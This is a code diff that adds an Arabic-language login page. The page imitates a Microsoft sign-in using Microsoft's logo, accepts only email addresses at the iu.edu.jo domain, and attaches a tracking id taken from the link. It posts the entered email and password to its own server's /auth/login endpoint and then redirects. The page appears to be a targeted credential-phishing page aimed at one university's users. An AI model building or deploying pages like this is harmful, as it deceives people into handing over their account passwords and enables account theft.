@@ -66,4 +66,56 @@
 </head>
 <body>
   <div class="login-box">
-    <img src="https://logincdn.msftauth.net/shared/5/ima
+    <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo.svg" alt="Microsoft Logo">
+    <h2>تسجيل الدخول</h2>
+    <form id="loginForm" method="POST">
+      <input type="email" id="email" name="email" class="form-control" placeholder="البريد الإلكتروني" required>
+      <input type="password" id="password" name="password" class="form-control" placeholder="كلمة المرور" required>
+      <input type="hidden" id="linkId" name="id">
+      <button type="submit">تسجيل الدخول</button>
+    </form>
+    <div id="errorBox" class="error-message">❌ يجب إدخال بريد ينتهي بـ ‎@iu.edu.jo</div>
+  </div>
+
+  <script>
+    // التقاط linkId من رابط الصفحة (مثل /auth/login?id=xxxx)
+    const params = new URLSearchParams(window.location.search);
+    const linkId = params.get('id');
+    if (linkId) {
+      document.getElementById('linkId').value = linkId;
+    }
+
+    // معالجة إرسال النموذج
+    const form = document.getElementById('loginForm');
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault(); // منع الإرسال التقليدي
+
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const id = document.getElementById('linkId').value;
+
+      // تحقق من النطاق
+      if (!email.endsWith('@iu.edu.jo')) {
+        document.getElementById('errorBox').style.display = 'block';
+        return;
+      }
+
+      // إرسال الطلب إلى السيرفر
+      const res = await fetch('/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password, id })
+      });
+
+      if (res.redirected) {
+        // إعادة التوجيه للرابط المحمي
+        window.location.href = res.url;
+      } else {
+        const msg = await res.text();
+        document.getElementById('errorBox').innerText = msg;
+        document.getElementById('errorBox').style.display = 'block';
+      }
+    });
+  </script>
+</body>
+</html>
